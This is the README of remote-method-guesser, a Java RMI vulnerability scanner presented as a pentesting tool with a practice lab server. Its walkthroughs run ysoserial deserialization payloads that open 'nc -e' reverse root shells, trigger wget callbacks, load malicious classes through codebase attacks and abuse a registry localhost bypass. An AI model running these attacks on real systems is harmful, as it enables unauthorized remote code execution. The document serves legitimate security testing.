### Remote Method Guesser

---

[![](https://github.com/qtc-de/remote-method-guesser/workflows/master%20maven%20CI/badge.svg?branch=master)](https://github.com/qtc-de/remote-method-guesser/actions/workflows/master.yml)
[![](https://github.com/qtc-de/remote-method-guesser/workflows/develop%20maven%20CI/badge.svg?branch=develop)](https://github.com/qtc-de/remote-method-guesser/actions/workflows/develop.yml)
[![](https://img.shields.io/badge/version-4.0.0-blue)](https://github.com/qtc-de/remote-method-guesser/releases)
[![](https://img.shields.io/badge/build%20system-maven-blue)](https://maven.apache.org/)
![](https://img.shields.io/badge/java-8%2b-blue)
[![](https://img.shields.io/badge/license-GPL%20v3.0-blue)](https://github.com/qtc-de/remote-method-guesser/blob/master/LICENSE)

*remote-method-guesser* (*rmg*) is a *Java RMI* vulnerability scanner and can be used to identify common security
vulnerabilities on *Java RMI* endpoints. The following list contains some of the currently supported operations:

* List available *bound names* and their corresponding (interface) class names
* List codebase locations (if exposed by the remote server)
* Check for common vulnerabilities (enabled class loader, missing *JEP290*, *JEP290* bypasses, localhost bypass)
* Identify existing remote methods by using a *bruteforce* (wordlist) approach
* Call remote methods with user specified arguments (no coding required)
* Call remote methods with *ysoserial gadgets* within the arguments
* Call remote methods with a client specified codebase (remote class loading attack)
* Perform *DGC* and *registry* calls with *ysoserial* gadgets or a client specified codebase
* Perform *bind*, *unbind* and *rebind* operations against a rmi registry
* Bypass registry filtering using [An Trinhs registry bypass](https://mogwailabs.de/de/blog/2020/02/an-trinhs-rmi-registry-bypass/)
* Enumerate the unmarshalling behavior of ``java.lang.String``
* Create *Java code* to invoke remote methods manually

![Remote Method Guesser Example](https://tneitzel.eu/73201a92878c0aba7c3419b7403ab604/rmg-example.gif)

[![BHUSA Arsenal 2021](https://raw.githubusercontent.com/toolswatch/badges/master/arsenal/usa/2021.svg)](https://www.blackhat.com/us-21/arsenal/schedule/#remote-method-guesser-a-java-rmi-vulnerability-scanner-24092)

*remote-method-guesser* was presented at [Black Hat USA2021](https://www.blackhat.com/us-21/arsenal/schedule/#remote-method-guesser-a-java-rmi-vulnerability-scanner-24092)
within the *Arsenal* sessions. The recording of the session and the corresponding slides are publicly available and can be found using the following links:

* Slides: [https://www.slideshare.net/TobiasNeitzel/remotemethodguesser-bhusa2021-arsenal](https://www.slideshare.net/TobiasNeitzel/remotemethodguesser-bhusa2021-arsenal)
* Recording: [https://youtu.be/t_aw1mDNhzI](https://youtu.be/t_aw1mDNhzI)

[![](https://github.com/qtc-de/remote-method-guesser/workflows/example%20server%20-%20master/badge.svg?branch=master)](https://github.com/qtc-de/remote-method-guesser/actions/workflows/master-example-server.yml)
[![](https://github.com/qtc-de/remote-method-guesser/workflows/example%20server%20-%20develop/badge.svg?branch=develop)](https://github.com/qtc-de/remote-method-guesser/actions/workflows/develop-example-server.yml)
[![](https://github.com/qtc-de/remote-method-guesser/workflows/ssrf%20server%20-%20master/badge.svg?branch=master)](https://github.com/qtc-de/remote-method-guesser/actions/workflows/master-ssrf-server.yml)
[![](https://github.com/qtc-de/remote-method-guesser/workflows/ssrf%20server%20-%20develop/badge.svg?branch=develop)](https://github.com/qtc-de/remote-method-guesser/actions/workflows/develop-ssrf-server.yml)

The *remote-method-guesser* repository contains two example servers that can be used to practice *Java RMI* enumeration and attacks.
The [rmg-example-server](/docker/example-server) exposes regular *RMI* services that can be enumerated and exploited using *remote-method-guesser*.
The [rmg-ssrf-server](/docker/ssrf-server) exposes an *HTTP* service that is vulnerable to *SSRF* attacks and runs *RMI* services that are only
listening on localhost. This can be used to practice with *remote-method-guesser's* ``--ssrf`` and ``--ssrf-response`` options.
Both servers are available as containers within the *GitHub Container Registry*:

* [SSRF Server GitHub Package](https://github.com/qtc-de/remote-method-guesser/pkgs/container/remote-method-guesser%2Frmg-ssrf-server)
* [Example Server GitHub Package](https://github.com/qtc-de/remote-method-guesser/pkgs/container/remote-method-guesser%2Frmg-example-server)


### Table of Contents

----

- [Installation](#installation)
- [Supported Operations](#supported-operations)
  + [enum](#enumeration)
  + [bind|rebind|unbind](#bind-operations)
  + [guess](#method-guessing)
  + [call](#calling-remote-methods) 
  + [method](#method-based-deserialization-attacks)
  + [act|dgc|reg](#general-deserialization-attacks)
  + [codebase](#codebase-attacks)
  + [listen](#jrmplistener)
  + [create-samples](#sample-generation)
- [Wordlist Files](#wordlist-files)
- [Template Files](#template-files)
- [Configuration](#configuration)
- [Acknowledgements](#acknowledgements)


### Installation

------

*rmg* is a *maven* project and installation should be straight forward. With [maven](https://maven.apache.org/) 
installed, just execute the following commands to create an executable ``.jar`` file:

```console
$ git clone https://github.com/qtc-de/remote-method-guesser
$ cd remote-method-guesser
$ mvn package
```

*rmg* does not include *ysoserial* as a dependency. To enable *ysoserial* support, you need either specify the path
to your ``ysoserial.jar`` file as additional argument (e.g. ``--yso /opt/ysoserial.jar``) or you change the
default path within the [rmg configuration file](./src/config.properties) before building the project.

*rmg* also supports autocompletion for *bash*. To take advantage of autocompletion, you need to have the
[completion-helpers](https://github.com/qtc-de/completion-helpers) project installed. If setup correctly, just
copying the [completion script](./resources/bash_completion.d/rmg) to your ``~/.bash_completion.d`` folder enables
autocompletion.

```console
$ cp resources/bash_completion.d/rmg ~/bash_completion.d/
```


### Supported Operations

-----

In the following, short examples for each available operation are presented. For a more detailed description
you should read the [documentation folder](./docs) that contains more detailed information on *rmg* and *Java RMI*
in general. All presented examples are based on the [rmg-example-server](https://github.com/qtc-de/remote-method-guesser/packages/414459)
that is also contained within this project. You can also modify and rebuild the example server yourself, by using
the sources within the [docker folder](./docker/example-server).

```console
[qtc@kali ~]$ rmg --help
usage: rmg [options] <ip> <port> <action>

rmg v3.3.0 - Java RMI Vulnerability Scanner.

Positional Arguments:
    ip                              IP address of the target
    port                            Port of the RMI registry
    action                          One of the possible actions listed below

Possible Actions:
    act <gadget> <command>          Performs Activator based deserialization attacks
    bind [gadget] <command>         Binds an object to the registry thats points to listener
    call <arguments>                Regulary calls a method with the specified arguments
    codebase <classname> <url>      Perform remote class loading attacks
    dgc <gadget> <command>          Perform DGC based deserialization attacks
    enum                            Enumerate bound names, classes, SecurityManger and JEP290
    guess                           Guess methods on bound names
    listen <gadget> <command>       Open ysoserials JRMP listener
    method <gadget> <command>       Perform method based deserialization attacks
    rebind [gadget] <command>       Rebinds boundname as object that points to listener
    reg <gadget> <command>          Perform registry based deserialization attacks
    unbind                          Removes the specified bound name from the registry

Optional Arguments:
    --argument-position <int>       select argument position for deserialization attacks
    --bound-name <name>             guess only on the specified bound name
    --config <file>                 path to a configuration file
    --create-samples                create sample classes for identified methods
    --dgc-method <method>           method to use during dgc operations (clean|dirty)
    --follow                        follow redirects to different servers
    --force-guessing                force guessing on known remote objects
    --force-legacy                  treat all classes as legacy stubs
    --guess-duplicates              guess duplicate remote classes
    --help                          display help message
    --localhost-bypass              attempt localhost bypass for registry operations (CVE-2019-2684)
    --no-color                      disable colored output
    --no-legacy                     disable automatic legacy stub detection
    --objid <objID>                 use an ObjID instead of bound names
    --plugin <path>                 file system path to a rmg plugin
    --reg-method <method>           method to use during registry operations (bind|lookup|unbind|rebind)
    --sample-folder <folder>        folder used for sample generation
    --signature <method>            function signature or one of (dgc|reg|act)
    --ssl                           use SSL for the rmi-registry connection
    --stack-trace                   display stack traces for caught exceptions
    --template-folder <folder>      location of the template folder
    --threads <int>                 maximum number of threads (default: 5)
    --trusted                       disable bound name filtering
    --update                        update wordlist file with method hashes
    --verbose                       enable verbose output
    --wordlist-file <file>          wordlist file to use for method guessing
    --wordlist-folder <folder>      location of the wordlist folder
    --yso <file>                    location of ysoserial.jar for deserialization attacks
    --zero-arg                      allow guessing on void functions (dangerous)
```


#### Enumeration

The ``enum`` action performs several checks on the specified *Java RMI* endpoint. It provides a list of all
available bound names (if the endpoint is a registry), displays the servers codebase (if existent), checks for missing *JEP290* and [some other
common vulnerabilities](./docs/rmg/actions.md#enum). ``enum`` is the default action of *remote-method-guesser* and can either be invoked by
only specifying the port and IP address of a target or by specifying ``enum`` as action explicitly.

```console
[qtc@kali ~]$ rmg 172.17.0.2 9010
[+] RMI registry bound names:
[+] 
[+] 	- plain-server2
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 	- plain-server
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 	- legacy-service
[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
[+] 
[+] RMI server codebase enumeration:
[+] 
[+] 	- http://iinsecure.dev/well-hidden-development-folder/
[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer
[+] 
[+] RMI server String unmarshalling enumeration:
[+] 
[+] 	- Caught ClassNotFoundException during lookup call.
[+] 	  --> The type java.lang.String is unmarshalled via readObject().
[+] 	  Configuration Status: Outdated
[+] 
[+] RMI server useCodebaseOnly enumeration:
[+] 
[+] 	- Caught MalformedURLException during lookup call.
[+] 	  --> The server attempted to parse the provided codebase (useCodebaseOnly=false).
[+] 	  Configuration Status: Non Default
[+] 
[+] RMI registry localhost bypass enumeration (CVE-2019-2684):
[+] 
[+] 	- Caught NotBoundException during unbind call (unbind was accepeted).
[+] 	  Vulnerability Status: Vulnerable
[+] 
[+] RMI DGC enumeration:
[+] 
[+] 	- Security Manager rejected access to the class loader.
[+] 	  --> The DGC uses most likely a separate security policy.
[+] 	  Configuration Status: Current Default
[+] 
[+] RMI server JEP290 enumeration:
[+] 
[+] 	- DGC rejected deserialization of java.util.HashMap (JEP290 is installed).
[+] 	  Vulnerability Status: Non Vulnerable
[+] 
[+] RMI registry JEP290 bypass enmeration:
[+] 
[+] 	- Caught IllegalArgumentException after sending An Trinh gadget.
[+] 	  Vulnerability Status: Vulnerable
[+] 
[+] RMI ActivationSystem enumeration:
[+] 
[+] 	- Caught IllegalArgumentException during activate call (activator is present).
[+] 	  --> Deserialization allowed	 - Vulnerability Status: Vulnerable
[+] 	  --> Client codebase enabled	 - Configuration Status: Non Default
```


#### Bind Operations

By using the ``bind``, ``rebind`` or ``unbind`` action, it is possible to modify the available *bound names* within the *RMI registry*.
This is especially useful for verifying ``CVE-2019-2684``, which bypasses the localhost restrictions and enables remote users to perform
bind operations. Whereas the ``unbind`` action only requires the *bound name* that should be removed, the ``bind`` and ``rebind`` operations
also require a *RemoteObject* that should be bound. *remote-method-guesser* always uses ``javax.management.remote.rmi.RMIServerImpl_Stub``
for this purpose, which is the *RemoteObject* used by *jmx*. You need also to specify the address of the corresponding *TCP endpoint*
(address where clients should connect to, when they attempt to use your bound object).

```console
[qtc@kali ~]$ rmg 172.17.0.2 9010
[+] RMI registry bound names:
[+] 
[+] 	- plain-server2
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 	- plain-server
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 	- legacy-service
[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
[...]

[qtc@kali ~]$ rmg 172.17.0.2 9010 bind 172.17.0.1:4444 --bound-name jmxrmi --localhost-bypass
[+] Binding name jmxrmi to javax.management.remote.rmi.RMIServerImpl_Stub
[+] 
[+] 	Encountered no Exception during bind call.
[+] 	Bind operation was probably successful.

[qtc@kali ~]$ rmg 172.17.0.2 9010
[+] RMI registry bound names:
[+] 
[+] 	- jmxrmi
[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class)
[+] 	- plain-server2
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 	- plain-server
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 	- legacy-service
[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
```

By using *rmg's Plugin System*, it is also possible to bind custom objects to the registry. To learn more about
the *Plugin System*, please refer to the [detailed documentation folder](./docs/rmg/plugin-system.md).


#### Method Guessing

When using the ``guess`` action, *remote-method-guesser* attempts to identify existing remote methods by sending method hashes
to the remote server. This operation requires a wordlist that contains the corresponding method definitions.
*remote-method-guesser* ships some default wordlists that are included into the ``.jar`` file during the build stage.
You can overwrite the wordlists by either modifying the [rmg configuration file](./src/config.properties) or by using the ``--wordlist-file``
or ``--wordlist-folder`` arguments. Methods with zero arguments are skipped during guessing, as they lead to real method calls
on the server side. You can enable guessing on zero argument methods by using the ``--zero-arg`` switch.

```console
[qtc@kali ~]$ rmg 172.17.0.2 9010 guess
[+] Reading method candidates from internal wordlist rmg.txt
[+] 	757 methods were successfully parsed.
[+] Reading method candidates from internal wordlist rmiscout.txt
[+] 	2550 methods were successfully parsed.
[+]
[+] Starting Method Guessing on 3286 method signature(s).
[+]
[+] 	MethodGuesser is running:
[+] 		--------------------------------
[+] 		[ legacy-service ] HIT! Method with signature void logMessage(int dummy1, String dummy2) exists!
[+] 		[ legacy-service ] HIT! Method with signature void releaseRecord(int recordID, String tableName, Integer remoteHashCode) exists!
[+] 		[ legacy-service ] HIT! Method with signature String login(java.util.HashMap dummy1) exists!
[+] 		[ plain-server2  ] HIT! Method with signature String system(String dummy, String[] dummy2) exists!
[+] 		[ plain-server2  ] HIT! Method with signature String execute(String dummy) exists!
[+] 	done.
[+]
[+] Listing successfully guessed methods:
[+]
[+] 	- legacy-service
[+] 		--> void logMessage(int dummy1, String dummy2)
[+] 		--> void releaseRecord(int recordID, String tableName, Integer remoteHashCode)
[+] 		--> String login(java.util.HashMap dummy1)
[+] 	- plain-server (== plain-server2)
[+] 		--> String system(String dummy, String[] dummy2)
[+] 		--> String execute(String dummy)
[+] 	- plain-server2
[+] 		--> String system(String dummy, String[] dummy2)
[+] 		--> String execute(String dummy)
```


#### Calling Remote Methods

Using *rmg's* ``call`` action, you can invoke remote methods without writing any *Java code*. In the previous example, we identified
that the method ``String execute(String dummy)`` exists on the remote server. This method sounds promising and you may want to invoke
it using a regular *Java RMI call*. This can be done by using the following command:

```console
[qtc@kali ~]$ rmg 172.17.0.2 9010 call '"wget 172.17.0.1:8000/worked"' --signature 'String execute(String dummy)' --bound-name plain-server
[+] RMI object tries to connect to different remote host: iinsecure.dev.
[+] 	Redirecting the connection back to 172.17.0.2... 
[+] 	This is done for all further requests. This message is not shown again. 

[qtc@kali www]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.17.0.2 - - [25/Mar/2021 07:14:22] "GET /worked HTTP/1.1" 200 -
```

Notice that calling remote methods does not create any output by default. To process outputs generated by the ``call`` action, you need
to use *rmg's* plugin system and register a ``ResponseHandler``. The [plugin folder](./plugins) of this repository contains a *GenericPrint*
plugin, that is suitable for most situations. To learn more about *rmg's* plugin system, please refer to the [detailed documentation folder](./docs/rmg/plugin-system.md).

```console
[qtc@kali remote-method-guesser]$ bash plugins/build.sh target/rmg-3.2.0-jar-with-dependencies.jar plugins/GenericPrint.java Plugin.jar
[qtc@kali remote-method-guesser]$ rmg 172.17.0.2 9010 call '"id"' --signature 'String execute(String dummy)' --bound-name plain-server --plugin Plugin.jar
[+] RMI object tries to connect to different remote host: iinsecure.dev.
[+] 	Redirecting the connection back to 172.17.0.2... 
[+] 	This is done for all further requests. This message is not shown again. 
uid=0(root) gid=0(root) groups=0(root)
```

During the ``call`` action, the argument string is evaluated as a *Java expression* of the following form: ``new Object[]{ <ARG> }``. Therefore,
you need to make sure that your argument string fits into that pattern and that you use the *Object* representation of primitive types
(e.g. new Integer(5) instead of 5). For more complex use cases, you can also define a custom ``ArgumentProvider`` by using *rmg's* plugin system.


#### Method Based Deserialization Attacks

Remote methods that do not only use primitive types within their arguments are often vulnerable to *deserialization attacks*.
This [blog post](https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/) by [Hans-Martin Münch](https://twitter.com/h0ng10)
explains this issue in more detail. *remote-method-guesser* can be used to easily verify such vulnerabilities. As an example,
we can use the ``String login(java.util.HashMap dummy1)`` method that was guessed in one of the previous examples.

```console
[qtc@kali ~]$ rmg 172.17.0.2 9010 method CommonsCollections6 "nc 172.17.0.1 4444 -e ash" --signature "String login(java.util.HashMap dummy1)" --bound-name legacy-service
[+] Creating ysoserial payload... done.
[+] 
[+] Attempting deserialization attack on RMI endpoint...
[+] 
[+] 	Using non primitive argument type java.util.HashMap on position 0
[+] 	Specified method signature is String login(java.util.HashMap dummy1)
[+] 	
[+] 	Caught ClassNotFoundException during deserialization attack.
[+] 	Server attempted to deserialize dummy class 70ca29163104477ca672e2ec2baa4beb.
[+] 	Deserialization attack probably worked :)

[qtc@kali ~]$ nc -vlp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:45771.
id
uid=0(root) gid=0(root) groups=0(root),
```

#### General Deserialization Attacks

Apart from *remote methods* on the application level, *RMI* endpoints also expose well known *remote methods* that are needed for the internal *RMI communication*.
Whereas modern *RMI servers* apply *deserialization filters* on these *well known remote methods* (*JEP290*), older servers may be vulnerable against *deserialization
attacks* too. *remote-method-guesser* allows to test this by using the ``act``, ``dgc`` and ``reg`` actions, that perform deserialization attacks on the *Activator*, *Distributed
Garbage Collector* (*DGC*) or the *RMI registry* directly. For testing purposes you can use the sufficiently outdated [example server](https://github.com/qtc-de/beanshooter/packages/398561)
from the the [beanshooter repository](https://github.com/qtc-de/beanshooter):

```console
[qtc@kali ~]$ rmg --ssl 172.17.0.2 9010 dgc CommonsCollections6 "nc 172.17.0.1 4444 -e /bin/sh"
[+] Creating ysoserial payload... done.
[+] 
[+] Attempting deserialization attack on DGC endpoint...
[+] 
[+] 	Caught ClassCastException during deserialization attack.
[+] 	Deserialization attack was probably successful :)

[qtc@kali ~]$ nc -vlp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:52598.
id
uid=0(root) gid=0(root) groups=0(root)
```

In case of the *RMI registry*, the *deserialization filters* may be bypassed by using the [JRMPClient](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/JRMPClient.java)
or the [An Trinh](https://mogwailabs.de/en/blog/2020/02/an-trinhs-rmi-registry-bypass/) bypass gadgets. These gadgets create an *outbound RMI channel*
that does no longer apply *deserialization filters*. On this channel, deserialization attacks can be applied as usual, but both bypasses were patched
in the most recent versions of *Java RMI*.

```console
[qtc@kali ~]$ rmg 172.17.0.2 9010 reg AnTrinh 172.17.0.1:4444
[+] 
[+] Attempting deserialization attack on RMI Registry endpoint...
[+] 
[+] 	Caught javax.management.BadAttributeValueExpException during deserialization attack.
[+] 	This could be caused by your gadget an the attack probably worked anyway.
[+] 	If it did not work, you can retry with --stack-trace to see the details.

[qtc@kali ~]$ rmg 0.0.0.0 4444 listen CommonsCollections6 "nc 172.17.0.1 4445 -e ash"
[+] Creating ysoserial payload... done.
[+] Creating a JRMPListener on 0.0.0.0:4444.
[+] Handing off to ysoserial...
Have connection from /172.17.0.2:52610
Reading message...
Sending return with payload for obj [0:0:0, 123]

[qtc@kali ~]$ nc -vlp 4445
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4445
Ncat: Listening on 0.0.0.0:4445
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:40023.
id
uid=0(root) gid=0(root) groups=0(root)
```

During it's ``enum`` action, *remote-method-guesser* informs you whether an *Activator* is present on the *RMI endpoint* (legacy *RMI mechanism*).
The default implementation for the *Activation system* does not implement any deserialization filters for the *Activator RemoteObject*. Therefore,
deserialization attacks on an *Activator* endpoint should always work, even on most recent *Java versions*.

```console
[qtc@kali ~]$ rmg 172.17.0.2 9010 act CommonsCollections6 "nc 172.17.0.1 4444 -e /bin/sh"
[+] Creating ysoserial payload... done.
[+] 
[+] Attempting deserialization attack on Activation endpoint...
[+] 
[+] 	Caught IllegalArgumentException during deserialization attack.
[+] 	Deserialization attack was probably successful :)

[qtc@kali ~]$ nc -vlp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:39655.
id
uid=0(root) gid=0(root) groups=0(root)
```


#### Codebase Attacks

*Java RMI* supports a feature called *codebases*, where the client and the server can specify *URLs* during *RMI calls* that
may be used to load unknown classes dynamically. If an *RMI server* accepts a *client specified codebase*, this can lead to
*remote code execution* by providing a malicious *Java* class during the *RMI communication*.

The codebase configuration on an *RMI server* can be different for the different components: *Activator*, *DGC*, *Registry* and *Application Level*.
*remote-method-guesser* allows you to test each component individually by using either ``--signature <method>`` (application level),
``--signature act`` (activator), ``--signature dgc`` (distributed garbage collector) or ``--signature reg`` (rmi registry) together with the
``codebase`` action.

*Application Level*:

```console
[qtc@kali ~]$ rmg 172.17.0.2 9010 codebase Example http://172.17.0.1:8000 --signature "String login(java.util.HashMap dummy1)" --bound-name legacy-service
[+] Attempting codebase attack on RMI endpoint...
[+] Using class Example with codebase http://172.17.0.1:8000/ during login call.
[+] 
[+] 	Using non primitive argument type java.util.HashMap on position 0
[+] 	Specified method signature is String login(java.util.HashMap dummy1)
[+] 	
[+] 	Remote class loader attempted to load dummy class 44c9f8b49776400eb6d3142a41060c69
[+] 	Codebase attack probably worked :)

[qtc@kali www]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.17.0.2 - - [26/Mar/2021 06:19:24] "GET /Example.class HTTP/1.1" 200 -
172.17.0.2 - - [26/Mar/2021 06:19:24] "GET /44c9f8b49776400eb6d3142a41060c69.class HTTP/1.1" 404 -
```

*RMI Registry*:

```console
[qtc@kali ~]$ rmg 172.17.0.2 9010 codebase Example http://172.17.0.1:8000 --signature reg
[+] Attempting codebase attack on RMI Registry endpoint...
[+] Using class Example with codebase http://172.17.0.1:8000/ during lookup call.
[+] 
[+] 	Caught ClassCastException during codebase attack.
[+] 	The server uses either readString() to unmarshal String parameters, or
[+] 	Codebase attack most likely worked :)

[qtc@kali www]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.17.0.2 - - [26/Mar/2021 06:20:47] "GET /Example.class HTTP/1.1" 200 -
```

*Distributed Garbage Collector*:

```console
[qtc@kali ~]$ rmg 172.17.0.2 9010 codebase Example http://172.17.0.1:8000 --signature reg
[+] Attempting codebase attack on RMI Registry endpoint...
[+] Using class Example with codebase http://172.17.0.1:8000/ during lookup call.
[+] 
[+] 	Caught ClassCastException during codebase attack.
[+] 	Codebase attack most likely worked :)

[qtc@kali www]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.17.0.2 - - [26/Mar/2021 06:22:23] "GET /Example.class HTTP/1.1" 200 -
```

*Activator*:

```console
[qtc@kali ~]$ rmg 172.17.0.2 9010 codebase Example http://172.17.0.1:8000 --signature act
[+] Attempting codebase attack on Activator endpoint...
[+] Using class Example with codebase http://172.17.0.1:8000/ during activate call.
[+] 
[+] 	Caught IllegalArgumentException during codebase attack.
[+] 	Codebase attack was probably successful :)

[qtc@kali www]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.17.0.2 - - [26/Mar/2021 06:23:42] "GET /Example.class HTTP/1.1" 200 -
```


#### JRMPListener

As already demonstrated above, it is sometimes required to provide a malicious *JRMPListener*, which serves deserialization payloads
to incoming *RMI* connections. Writing such a listener from scratch is not necessary, as it is already provided by the
[ysoserial project](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPListener.java).
*remote-method-guesser* provides a wrapper around the *ysoserial* implementation, which lets you spawn a *JRMPListener*
by using the usual *rmg* syntax:

```console
[qtc@kali ~]$ rmg 0.0.0.0 4444 listen CommonsCollections6 "touch /dev/shm/test"
[+] Creating ysoserial payload... done.
[+] Creating a JRMPListener on 0.0.0.0:4444.
[+] Handing off to ysoserial...
```


#### Sample Generation

Despite being none of the available actions, *sample generation* is another useful feature of *remote-method-guesser* and can be enabled
during the ``guess`` action. As already mentioned above, *RMI* endpoints may expose methods that sound interesting on their own, without thinking
about *deserialization* or *codebase attacks*. Calling such methods is already possible using *rmg's* ``call`` action, but in some situations
it is more useful to generate *Java code* that can be used to invoke the method.

By using the ``--create-samples`` parameter, you can create sample code for successfully guessed *remote methods* automatically. Using the ``--signature``
and ``--bound-name`` options, it is also possible to generate code only for one already known method. The following command generates the required *Java code*
to invoke the ``execute`` method on the ``plain-server`` bound name:

```console
[qtc@kali ~]$ rmg 172.17.0.2 9010 guess --create-samples --signature "String execute(String dummy)" --bound-name plain-server
[+]
[+] Starting Method Guessing on 1 method signature(s).
[+] Method signature: String execute(String dummy).
[+]
[+] 	MethodGuesser is running:
[+] 		--------------------------------
[+] 		[ plain-server ] HIT! Method with signature String execute(String dummy) exists!
[+] 	done.
[+]
[+] Listing successfully guessed methods:
[+]
[+] 	- plain-server
[+] 		--> String execute(String dummy)
[+]
[+] Starting creation of sample files:
[+]
[+] 	Sample folder /home/qtc/rmg-samples does not exist.
[+] 	Creating sample folder.
[+]
[+] 	Creating samples for bound name plain-server.
[+] 		Writing sample file /home/qtc/rmg-samples/plain-server/IPlainServer.java
[+] 		Writing sample file /home/qtc/rmg-samples/plain-server/execute/execute.java
```

For an successful *RMI call* you always need an interface definition and the code for the actual method call.
The interface file created by *remote-method-guesser* (``IPlainServer.java``) can be compiled right
away, whereas the actual method call (``execute.java``) contains a ``TODO`` for each method argument.

```console
[qtc@kali ~]$ grep -A 5 "TODO" /home/qtc/rmg-samples/plain-server/execute/execute.java
            java.lang.String argument0 = TODO;

            System.out.print("[+] Invoking method execute... ");
            java.lang.String response = stub.execute(argument0);
            System.out.println("done!");
```

For this demonstration, ``TODO`` is replaced by the String ``id``, as the method name ``execute`` could mean that the argument is used for
command execution. After making this substitution and compiling the two generated files, the *remote method* can be invoked:

```console
[qtc@kali ~]$ cd /home/qtc/rmg-samples/plain-server/
[qtc@kali plain-server]$ javac IPlainServer.java -d .
[qtc@kali plain-server]$ sed -i -e 's/TODO/"id"/' execute/execute.java 
[qtc@kali plain-server]$ javac execute/execute.java -d .
[qtc@kali plain-server]$ java execute
[+] Connecting to registry on 172.17.0.2:9010... done!
[+] Starting lookup on plain-server... 
[+] RMI object tries to connect to different remote host: iinsecure.dev
[+]	Redirecting the connection back to 172.17.0.2... 
[+]	This is done for all further requests. This message is not shown again. 
[+] Invoking method execute... done!
[+] The servers response is: uid=0(root) gid=0(root) groups=0(root)
```


### Wordlist Files

-----

*remote-method-guesser* guesses *remote methods* based on a wordlist approach. Corresponding wordlists are shipped within this repository and are contained
within the [wordlist directory](./wordlists). Wordlists are stored in an optimized *rmg-internal* format:

```
<RETURN_VALUE> <METHODNAME>(<ARGUMENTS>); <METHOD_HASH>; <IS_PRIMITIVE>; <IS_VOID>;
```

The first three placeholders should be self explanatory and match the format of a common *Java method signature*. The last three placeholders
describe the following properties of a function:

1. ``<METHOD_HASH>``: The method hash that is used by *RMI* internally to identify the remote method.
2. ``<IS_PRIMITIVE>``: Describes whether the first function parameter is a primitive type or not.
3. ``<IS_VOID>``: Describes whether the function takes parameters or not (yes, the name is a little bit misleading).

All this information is used to speed up *RMI calls* and to reduce the amount of *dynamic class generation*. The resulting wordlist files
look like this:

```console
[qtc@kali wordlists]$ head -n 5 rmg.txt 
boolean call(String dummy, String dummy2, String dummy3); 2142673766403641873; false; false
boolean call(String dummy, String dummy2); -9048491806834107285; false; false
boolean call(String dummy, String[] dummy2); 7952470873340381142; false; false
boolean call(String dummy); -5603201874062960450; false; false
boolean call(String[] dummy); -4301784332653484516; false; false
```

However, *remote-method-guesser* is also able to process non-optimized wordlists that contain plain function signatures:

```console
[qtc@kali ~]$ echo "boolean example_signature(String test)" > custom_wordlist.txt
[qtc@kali ~]$ rmg --ssl --wordlist-file ./custom_wordlist.txt 172.17.0.2 1090 guess
[+] Reading method candidates from file /home/qtc/custom_wordlist.txt
[+] 	1 methods were successfully parsed.
[+]
[+] Starting Method Guessing on 1 method signature(s).
[+] Method signature: boolean example_signature(String test).
[+]
[+] 	MethodGuesser is running:
[+] 		--------------------------------
[+] 	done.
[+]
[+] No remote methods identified :(
```

By using the ``--update`` switch during the ``guess`` action, *remote-method-guesser* updates your wordlist to the optimized format:

```console
[qtc@kali ~]$ rmg --ssl --wordlist-file ./custom_wordlist.txt 172.17.0.2 1090 guess --update
[...]
[qtc@kali ~]$ cat custom_wordlist.txt
boolean example_signature(String test); -8079561808652318592; 0; false
```

Since version ``v3.2.0``, *remote-method-guesser* does no longer use a default wordlist directory, but contains it's default wordlists
within the *JAR archive*. This allows the *JAR* to work as a standalone without any requirements on the directory structure. However,
if you want to add a default wordlist directory again, you can still configure it within the [rmg configuration file](#configuration)
or specify it dynamically using the ``--wordlist-file`` and ``--wordlist-folder`` command line options.


### Template Files

----

Template files are used by *remote-method-guesser* for sample generation. They are located in the [templates folder](./templates) and
contain all the *Java code* required for sample generation (apart from some placeholders). During the sample generation process,
*rmg* simply replaces the placeholders with appropriate values for the current *remote method*.

Since version ``v3.2.0`` *remote-method-guesser* does no longer use a default template directory, but contains it's default templates
within the *JAR archive*. This allows the *JAR* to work as a standalone without any requirements on the directory structure. However,
if you want to add a default template directory again, you can still configure it within the [rmg configuration file](#configuration)
or specify it dynamically using the ``--template-folder`` command line option. That being said, it is generally not recommended to modify
the template files, but it is of cause possible if you know what you are doing. However, keep in mind that template files should stay generic
